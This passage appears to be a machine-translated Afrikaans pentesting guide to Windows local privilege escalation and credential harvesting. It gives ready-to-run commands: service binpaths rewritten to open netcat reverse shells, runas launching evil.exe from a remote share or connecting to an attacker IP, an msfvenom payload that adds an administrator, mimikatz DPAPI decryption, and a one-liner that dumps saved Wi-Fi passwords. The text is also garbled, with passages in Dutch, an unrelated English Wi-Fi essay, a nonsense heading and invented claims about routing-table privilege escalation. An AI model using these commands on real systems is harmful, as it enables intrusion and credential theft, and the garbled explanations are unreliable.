3. Die gekopieerde teks sal nou in die teksdokument of toepassing verskyn.

Hierdie metode sal die teks wat in die knipbord gekopieer is, herstel en dit moontlik maak om dit in 'n ander toepassing te gebruik.
```bash
powershell -command "Get-Clipboard"
```
## Lopende Prosesse

### Lêer- en Vouerregte

Eerstens, lys die prosesse **om te kyk vir wagwoorde binne die opdraglyn van die proses**.\
Kyk of jy **'n lopende binêre lêer kan oorskryf** of as jy skryfregte het op die binêre lêervouer om moontlike [**DLL Hijacking-aanvalle**](dll-hijacking.md) uit te buit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Altyd kyk vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om voorregte te verhoog](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kyk na die toestemmings van die prosesse se binêre lêers**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Om die toestemmings van die lêers van die prosesse se binnerwerke te kontroleer (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Geheue Wagwoordontginning

Jy kan 'n geheue-dump van 'n lopende proses skep deur gebruik te maak van **procdump** van sysinternals. Dienste soos FTP het die **legkaart wagwoorde in die geheue**, probeer om die geheue te dump en die wagwoorde te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassingen wat as SYSTEM loop, mag 'n gebruiker toelaat om 'n CMD te skep of deur gids te blaai.**

Voorbeeld: "Windows Help en Ondersteuning" (Windows + F1), soek na "opdragpunt", klik op "Klik om die opdragpunt oop te maak"

## Dienste

Kry 'n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting oor 'n diens te bekom.
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binaêre lêer **accesschk** van _Sysinternals_ te hê om die vereiste bevoorregtingsvlak vir elke diens te kontroleer.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Geauthentiseerde Gebruikers" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Jy kan accesschk.exe vir XP hier aflaai](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout ondervind (byvoorbeeld met SSDPSRV):

_Sisteemfout 1058 het voorgekom._\
_Die diens kan nie gestart word nie, óf omdat dit gedeaktiveer is óf omdat dit geen geaktiveerde toestelle daarmee geassosieer het nie._

Jy kan dit aktiveer deur die volgende te doen:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost afhanklik is van SSDPSRV om te werk (vir XP SP1)**

**'n Ander omweg** vir hierdie probleem is om die volgende uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig diens binêre pad**

In die scenario waar die "Authenticated users" groep **SERVICE_ALL_ACCESS** op 'n diens het, is dit moontlik om die uitvoerbare binêre van die diens te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herlaai diens

Om 'n diens te herlaai, kan jy die volgende stappe volg:

1. Identifiseer die naam van die diens wat jy wil herlaai.
2. Open 'n bevoorregte opdragvenster.
3. Tik die volgende opdrag in om die diens te herlaai:

   ```plaintext
   net stop [diensnaam]
   net start [diensnaam]
   ```

   Vervang `[diensnaam]` met die werklike naam van die diens.

Hierdie opdrag sal die spesifieke diens stop en dan weer begin, wat kan help om probleme op te los of veranderinge in die diens toe te pas.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Priveleges kan verhoog word deur verskeie toestemmings:
- **SERVICE_CHANGE_CONFIG**: Maak herkonfigurasie van die diens binêre lêer moontlik.
- **WRITE_DAC**: Stel toestemmingsherkonfigurasie in, wat lei tot die vermoë om dienskonfigurasies te verander.
- **WRITE_OWNER**: Maak eienaarskapverkryging en toestemmingsherkonfigurasie moontlik.
- **GENERIC_WRITE**: Erf die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erf ook die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan die _exploit/windows/local/service_permissions_ gebruik word.

### Diensbinêre lêers met swak toestemmings

**Kyk of jy die binêre lêer wat deur 'n diens uitgevoer word kan wysig** of as jy **skryftoestemmings het op die vouer** waar die binêre lêer geleë is ([**DLL Hijacking**](dll-hijacking.md))**.**\
Jy kan elke binêre lêer wat deur 'n diens uitgevoer word kry deur **wmic** (nie in system32) te gebruik en jou toestemmings te kontroleer deur **icacls** te gebruik:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Diensregister wysigingsregte

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan jou **regte** oor 'n diens **register** nagaan deur die volgende te doen:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Dit moet nagegaan word of **Geauthentiseerde Gebruikers** of **NT AUTHORITY\INTERACTIVE** `FullControl` toestemmings het. Indien wel, kan die binêre uitvoerder van die diens gewysig word.

Om die pad van die uitgevoerde binêre te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Dienste-register AppendData/AddSubdirectory-toestemmings

As jy hierdie toestemming het oor 'n register, beteken dit dat **jy subregisters kan skep vanuit hierdie een**. In die geval van Windows-dienste is dit **genoeg om willekeurige kode uit te voer:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Ongewone dienspaaie sonder aanhalingstekens

As die pad na 'n uitvoerbare lêer nie binne aanhalingstekens is nie, sal Windows probeer om elke einde voor 'n spasie uit te voer.

Byvoorbeeld, vir die pad _C:\Program Files\Some Folder\Service.exe_ sal Windows probeer om uit te voer:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lys alle ongekwoteerde dienspaaie op, met uitsluiting van dié wat behoort aan ingeboude Windows-dienste:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan hierdie kwesbaarheid opspoor en uitbuit** met metasploit: `exploit/windows/local/trusted\_service\_path`
Jy kan handmatig 'n diensbinêre lêer skep met metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Herstelaksies

Windows stel gebruikers in staat om aksies te spesifiseer wat geneem moet word as 'n diens misluk. Hierdie funksie kan gekonfigureer word om te verwys na 'n binêre lêer. As hierdie binêre lêer vervangbaar is, kan voorregverhoging moontlik wees. Meer besonderhede kan gevind word in die [ampertlike dokumentasie](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Toepassings

### Geïnstalleerde Toepassings

Kyk na die **toestemmings van die binêre lêers** (miskien kan jy een oorskryf en voorregte verhoog) en van die **lêers** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryf Toestemmings

Kyk of jy 'n konfigurasie-lêer kan wysig om 'n spesiale lêer te lees, of as jy 'n binêre lêer kan wysig wat deur 'n Administrateur-rekening uitgevoer gaan word (schedtasks).

'n Manier om swak vouer/lêer-toestemmings in die stelsel te vind, is om die volgende te doen:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Voer by opstart uit

**Kyk of jy enige register of binêre lêer kan oorskryf wat deur 'n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te wete te kom oor interessante **autorun-plekke om voorregte te verhoog**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Bestuurders

Soek na moontlike **derde party vreemde/kwesbare** bestuurders
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PAD DLL-ontvoering

As jy **skryftoestemmings binne 'n gids op die PAD** het, kan jy 'n DLL wat deur 'n proses gelaai word, ontvoer en sodoende **voorregte verhoog**.

Kyk na die toestemmings van alle gidse binne die PAD:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie kontrole te misbruik:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Netwerk

### Gedeeltes
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### gasheerlêer

Kyk vir ander bekende rekenaars wat hardgekodder is op die gasheerlêer.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerkinterfaces & DNS

#### Netwerkinterfaces

Netwerkinterfaces verwijzen naar de fysieke of virtuele apparaten die worden gebruikt om verbinding te maken met een netwerk. Ze kunnen worden gebruikt om gegevens te verzenden en ontvangen via verschillende protocollen, zoals Ethernet, Wi-Fi, Bluetooth, enzovoort. Het is belangrijk om de netwerkinterfaces op een systeem te begrijpen, omdat ze kunnen worden gebruikt om toegang te krijgen tot andere apparaten in het netwerk of om verkeer te onderscheppen.

#### DNS (Domain Name System)

DNS staat voor Domain Name System en is een systeem dat wordt gebruikt om domeinnamen om te zetten in IP-adressen. Wanneer u een domeinnaam invoert in uw webbrowser, zoals www.example.com, wordt deze domeinnaam vertaald naar het bijbehorende IP-adres, zoals 192.168.0.1, door het DNS-systeem. Dit stelt uw computer in staat om verbinding te maken met de juiste server en de gevraagde webpagina op te halen.

DNS kan ook worden gebruikt voor kwaadwillende doeleinden, zoals DNS-spoofing of DNS-vergiftiging, waarbij een aanvaller de DNS-resolutie manipuleert om gebruikers om te leiden naar kwaadaardige websites of om verkeer te onderscheppen. Het is belangrijk om de beveiliging van DNS te waarborgen om dergelijke aanvallen te voorkomen.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Poorte

Kyk vir **beperkte dienste** van buite af.
```bash
netstat -ano #Opened ports?
```
### Roetetabel

Die roetetabel is 'n kritiese komponent van 'n rekenaar se netwerkstelsel. Dit bevat 'n lys van roetes wat gebruik word om data te stuur na die regte bestemming. Die roetetabel bepaal watter netwerkinterfaces gebruik word om data te stuur en watter roetes geneem moet word om die bestemming te bereik.

Die roetetabel kan 'n belangrike rol speel in die verhoging van plaaslike bevoorregting. Deur die roetetabel te manipuleer, kan 'n aanvaller 'n pad skep na 'n hoër bevoorregte rekening of stelsel. Hier is 'n paar tegnieke wat gebruik kan word om plaaslike bevoorregting te verhoog deur die roetetabel te misbruik:

- **Roetetabelverandering**: 'n Aanvaller kan die roetetabel wysig om data na 'n spesifieke bestemming te stuur deur 'n ander roete te gebruik. Dit kan gebruik word om data na 'n rekening met hoër bevoorregting te stuur.
- **Roetetabelinjeksie**: 'n Aanvaller kan valse roetes in die roetetabel invoeg om data na 'n spesifieke bestemming te stuur. Hierdie tegniek kan gebruik word om data na 'n aanvaller se eie stelsel te stuur, waar dit verder gemanipuleer kan word om plaaslike bevoorregting te verkry.
- **Roetetabelverwydering**: 'n Aanvaller kan roetes uit die roetetabel verwyder om te voorkom dat data na 'n spesifieke bestemming gestuur word. Hierdie tegniek kan gebruik word om die funksionaliteit van 'n stelsel te beperk of om te voorkom dat sekuriteitsmaatreëls toegepas word.

Dit is belangrik om die roetetabel van 'n stelsel te monitor en te verseker dat slegs geaggregeerde en betroubare roetes daarin voorkom. Deur die nodige maatreëls te tref om die roetetabel te beskerm, kan die risiko van plaaslike bevoorregting deur roetetabelmanipulasie verminder word.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-tabel

Die ARP-tabel (Address Resolution Protocol) is 'n tabel wat gebruik word deur 'n rekenaarstelsel om die verband tussen IP-adresse en MAC-adresse te stoor. Dit dien as 'n naslaanbron wanneer 'n rekenaar wil kommunikeer met 'n ander rekenaar in dieselfde netwerk. Die ARP-tabel bevat inskrywings wat die IP-adres en die bybehorende MAC-adres van elke toestel in die netwerk verteenwoordig.

Wanneer 'n rekenaar 'n kommunikasiepoging met 'n ander toestel in die netwerk maak, kyk dit eers na sy ARP-tabel om die MAC-adres van die doeltoestel te vind. As die inskrywing in die ARP-tabel nie bestaan nie, sal die rekenaar 'n ARP-versoek uitsaai om die MAC-adres van die doeltoestel te bekom. Die doeltoestel sal dan 'n ARP-antwoord stuur met sy MAC-adres, wat deur die oorspronklike rekenaar gebruik sal word om die kommunikasie te begin.

Die ARP-tabel is 'n belangrike komponent van netwerkverbindings en word dikwels gebruik in netwerktoepassings en -dienste. Dit speel ook 'n rol in sekuriteitsaspekte soos ARP-vergiftiging, waar 'n aanvaller probeer om die ARP-tabel te manipuleer om ongemagtigde toegang tot die netwerk te verkry.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Vuurmuur Reëls

[**Kyk hierdie bladsy vir Vuurmuur-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel aan...)**

Meer [opdragte vir netwerkondersoek hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsisteem vir Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root-gebruiker kry, kan jy na enige poort luister (die eerste keer as jy `nc.exe` gebruik om na 'n poort te luister, sal dit via 'n GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer.

Jy kan die `WSL`-lêersisteem verken in die `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`-gids.

## Windows Geloofsbriewe

### Winlogon Gelofsbriewe
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Legitimasiebestuurder / Windows-kluis

Vanaf [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows-kluis stoor gebruikerslegitimasie vir bedieners, webwerwe en ander programme waarop **Windows outomaties die gebruikers kan laat inteken**. Op die eerste oogopslag mag dit lyk asof gebruikers hul Facebook-legitimasie, Twitter-legitimasie, Gmail-legitimasie ens. kan stoor, sodat hulle outomaties kan inteken via webblaaier. Maar dit is nie so nie.

Die Windows-kluis stoor legitimasie wat Windows outomaties kan laat inteken, wat beteken dat enige **Windows-toepassing wat legitimasie benodig om toegang tot 'n hulpbron** (bediener of webwerf) **te verkry, gebruik kan maak van hierdie Legitimasiebestuurder en Windows-kluis en die voorsiening van legitimasie kan gebruik in plaas daarvan dat gebruikers die gebruikersnaam en wagwoord elke keer moet invoer.

Tensy die toepassings met die Legitimasiebestuurder interaksie het, dink ek nie dit is moontlik vir hulle om die legitimasie vir 'n gegewe hulpbron te gebruik nie. Dus, as jou toepassing die kluis wil gebruik, moet dit op een of ander manier **met die legitimasiebestuurder kommunikeer en die legitimasie vir daardie hulpbron aanvra** vanuit die verstek bergingkluis.

Gebruik die `cmdkey` om die gestoorde legitimasie op die rekenaar te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` gebruik met die `/savecred` opsies om die gestoorde geloofsbriewe te gebruik. Die volgende voorbeeld roep 'n afgeleë binêre lêer aan deur middel van 'n SMB-deel.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met 'n voorsiene stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Let wel dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), of van [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) gebruik kan word.

### DPAPI

Die **Data Protection API (DPAPI)** bied 'n metode vir simmetriese versleuteling van data, hoofsaaklik gebruik binne die Windows bedryfstelsel vir die simmetriese versleuteling van asimmetriese private sleutels. Hierdie versleuteling maak gebruik van 'n gebruiker of stelsel geheim om betekenisvol by te dra tot entropie.

**DPAPI maak die versleuteling van sleutels moontlik deur 'n simmetriese sleutel wat afgelei word van die gebruiker se aanmeldingsgeheime**. In gevalle waar stelselversleuteling betrokke is, maak dit gebruik van die stelsel se domein-verifikasiegeheime.

Versleutelde RSA-sleutels van gebruikers, deur DPAPI te gebruik, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) voorstel. **Die DPAPI-sleutel, saam met die meestersleutel wat die gebruiker se private sleutels in dieselfde lêer beskerm, bestaan tipies uit 64 byte willekeurige data**. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is en dat die inhoud daarvan nie gelys kan word deur die `dir`-opdrag in CMD nie, alhoewel dit wel deur PowerShell gelys kan word).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz-module** `dpapi::masterkey` gebruik met die toepaslike argumente (`/pvk` of `/rpc`) om dit te ontsluit.

Die **legitimasie-lêers wat deur die meesterwagwoord beskerm word**, is gewoonlik geleë in:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan die **mimikatz-module** `dpapi::cred` gebruik met die toepaslike `/masterkey` om te ontsleutel.\
Jy kan **baie DPAPI-meesterkodes** uit **geheue** onttrek met die `sekurlsa::dpapi`-module (as jy root is).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell-legitimasie

**PowerShell-legitimasie** word dikwels gebruik vir **skripsie** en outomatiseringstake as 'n manier om versleutelde legitimasie gerieflik te stoor. Die legitimasie word beskerm deur **DPAPI**, wat tipies beteken dat dit slegs deur dieselfde gebruiker op dieselfde rekenaar waarop dit geskep is, ontsluit kan word.

Om 'n PS-legitimasie te **ontsleutel** vanuit die lêer wat dit bevat, kan jy die volgende doen:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

#### Introduction

Wifi is a wireless technology that allows devices to connect to the internet or communicate with each other without the need for physical cables. It is commonly used in homes, offices, and public spaces to provide internet access to multiple devices simultaneously.

#### How Wifi Works

Wifi works by using radio waves to transmit data between devices. A wireless router or access point is used to create a local network, and devices with wifi capabilities can connect to this network to access the internet.

When a device wants to connect to a wifi network, it sends a request to the router or access point. The router then authenticates the device and assigns it an IP address. Once connected, the device can send and receive data over the wifi network.

#### Wifi Security

Wifi networks can be secured using various security protocols to prevent unauthorized access and protect the data being transmitted. The most common security protocols used in wifi networks are:

- Wired Equivalent Privacy (WEP): This is the oldest and least secure protocol. It uses a shared key to encrypt data, but the encryption can be easily cracked.

- Wi-Fi Protected Access (WPA): This protocol provides better security than WEP. It uses a pre-shared key (PSK) or a passphrase to encrypt data.

- Wi-Fi Protected Access 2 (WPA2): This is the most secure protocol currently available. It uses a stronger encryption algorithm called Advanced Encryption Standard (AES) and provides better protection against attacks.

It is important to use a strong password or passphrase for wifi networks to prevent unauthorized access. Additionally, it is recommended to regularly update the firmware of the router or access point to fix any security vulnerabilities.

#### Wifi Hacking

Wifi networks can be vulnerable to hacking if they are not properly secured. Hackers can use various techniques to gain unauthorized access to wifi networks, such as:

- Brute forcing: This involves trying all possible combinations of passwords until the correct one is found.

- Dictionary attacks: This involves using a list of commonly used passwords to try and gain access.

- WPS attacks: Some routers have a feature called Wi-Fi Protected Setup (WPS) that allows users to easily connect devices to the network. However, this feature can be exploited by hackers to gain access to the network.

To protect against wifi hacking, it is important to use strong security protocols such as WPA2, and to regularly update the firmware of the router or access point. Additionally, it is recommended to use a strong password or passphrase that is not easily guessable.

#### Conclusion

Wifi is a convenient and widely used technology for connecting devices to the internet. However, it is important to ensure that wifi networks are properly secured to prevent unauthorized access and protect sensitive data. By using strong security protocols, regularly updating firmware, and using strong passwords, users can minimize the risk of wifi hacking.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan hulle vind op `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs Uitgevoerde Opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Verrekenaar vir Verrekenaar se Verrekenaar**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die gepaste `/masterkey` om enige .rdg-lêers te **ontsleutel**.\
Jy kan **baie DPAPI-meestersleutels** uit die geheue haal met die Mimikatz `sekurlsa::dpapi` module.

### Plakbriefies

Mense gebruik dikwels die Plakbriefies-app op Windows-werkstasies om wagwoorde en ander inligting te **stoor**, sonder om te besef dat dit 'n databasislêer is. Hierdie lêer is geleë by `C:\Users\<gebruiker>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om na te soek en te ondersoek.

### AppCmd.exe

**Merk op dat jy 'n Administrateur moet wees en onder 'n Hoë Integriteitsvlak moet loop om wagwoorde van AppCmd.exe te herstel.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\`-gids.\
As hierdie lêer bestaan, is dit moontlik dat sekere **volmagte** gekonfigureer is en herstel kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

